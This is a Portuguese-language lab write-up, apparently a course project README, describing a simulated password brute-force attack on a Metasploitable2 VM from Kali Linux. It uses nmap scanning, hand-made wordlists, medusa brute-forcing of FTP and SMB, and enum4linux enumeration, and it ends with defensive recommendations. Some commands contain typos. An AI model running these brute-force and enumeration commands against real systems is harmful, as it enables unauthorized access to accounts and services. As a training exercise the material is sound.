# cybersecurity-dio-bruteforce
resolucao do projecto "Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux"

# configuracao das vms (1-metasploitable2; 1-kali)
O metasploitable é para facilitar os ataques uma vez que esta tudo vulneravel por padrão. Ja o kali é tara testamos e invadir o ms
 

## metasploitable2
	baixamos no link (https://sourceforge.net/projects/metasploitable/files/latest/download)

	E fazemos a instalacao e configuracao

# ataques
## varredura

	nmap -v 192.168.56.0/24 
	encontrou portas abertas no ip 192.168.56.101
	encontrou as 4 maquinas ja estao instaladas na minha vm. 
	È como se fosse um router conectado com 4 computadores mas apenas o 192.168.56.101 que é o metasploitable esta vulneravel.

	o ataque mostrou tambem a versao do sistema que é linux 2.6.x com kernel 2.6, mostro portas ssh, ftp, smb e outras bem abertas
	e ainda tisse que a dificuldade de ataque é nivel 201

## bruteforce ou conexao direta

	echo -e "user\nmsfadmin\nroot\msfadmin\jose" > users.txt && echo -e "123456\npassword\nqwerty\nmsfadmin\msfadmin\admin" > pass.txt
	escrevemos algumas palavras ou lista possiveis de senha e usuarios
	
	medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
	foi para fazer forca bruta com as senhas qu wja definimos, os resultado foi surpreendente como mostra a img "forca bruta e aesso ftp.png"
	encontrou o msfadmin como usuario e como senha
	
### entrando para esplorar o SMB
	enun4linux -a 192.168.56.101 | tee enun4_output.txt
	ai enumerou todos os usuario e servicos e ainda o que cada usuario pode fazer e tambem que servico pode acessar como mostra o arquivo "enun4_output.txt"
	
	echo -e "user\nmsfadmin\msfadmin\nservice\admin" > smb_user.txt && echo -e "password\n123456\nWelcome123\msfadmin\admin" > senhas_Spray.txt
	escrevemos denovo uma lista de usuarios e uma de senha para tentar acessar o smb
	
	medusa -h 192.168.56.101 -U smb_user.txt -P senhas_Spray.txt -M smbnt -t 2 t 50
	fez forca bruta e deu acesso ao smb.
	
# obs
	o que achei bom foi que para acessar o servidor smb pediu a senha do administrador mas como ja estava comprometida foi so digitar e passamos limpo.

# consideracoes finais
	se isso fosse de uma empresa aconselharia:
	1-fechar todas as portas desnecessarias; 
	2-maior cuidado principalmente com servicos intenos como base de dados, moteres principais sejam core bancario, api, redes de telefonia etc. 
	3-Aconselharia a usar autenticacao de dois lados uma vez que quando algem faz login pede senha de acesso.
	
